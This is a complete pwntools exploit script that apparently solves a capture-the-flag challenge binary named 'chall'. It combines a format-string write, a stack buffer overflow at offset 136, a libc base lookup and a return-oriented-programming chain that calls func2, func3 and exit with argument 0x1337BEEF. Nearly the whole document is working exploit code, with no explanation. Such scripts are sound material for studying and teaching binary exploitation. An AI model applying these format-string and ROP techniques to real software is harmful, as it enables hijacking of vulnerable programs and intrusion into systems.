from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
context.arch = "amd64"

FUNC1 = elf.symbols["func1"]
FUNC2 = elf.symbols["func2"]
FUNC3 = elf.symbols["func3"]
GATE  = elf.symbols["gate"]

NEXT_STAGE = elf.symbols["next_stage"]

OFFSET = 136

io = process(elf.path, aslr=False)

fmt = b"%1$5571c%10$hn%1$125c%11$hhn"
fmt += b"A" * (32 - len(fmt))

fmt += p64(NEXT_STAGE)
fmt += p64(NEXT_STAGE + 2)

assert len(fmt) <= 63

io.sendlineafter(b"Input : ", fmt)

payload = flat(
    b"A" * OFFSET,
    FUNC1
)

io.sendlineafter(b"Input password : ", payload)
libc_path = next(
    path for path in io.libs()
    if path.endswith("/libc.so.6")
)

libc = ELF(libc_path, checksec=False)
libc.address = io.libs()[libc_path]

log.info("libc base  = %#x", libc.address)

rop_libc = ROP(libc)

POP_RDI = rop_libc.find_gadget(
    ["pop rdi", "ret"]
)[0]

RET = ROP(elf).find_gadget(
    ["ret"]
)[0]

EXIT = libc.sym["exit"]

log.info("pop rdi    = %#x", POP_RDI)
log.info("ret        = %#x", RET)
log.info("func1      = %#x", FUNC1)
log.info("func2      = %#x", FUNC2)
log.info("func3      = %#x", FUNC3)
log.info("exit       = %#x", EXIT)


payload = flat(
    b"A" * OFFSET,
    POP_RDI,
    0x1337BEEF,
    RET,
    FUNC2,
    FUNC3,
    EXIT
)

io.sendlineafter(b"Input : ", payload)
io.sendlineafter(b"Input : ", b"continue")

io.interactive()
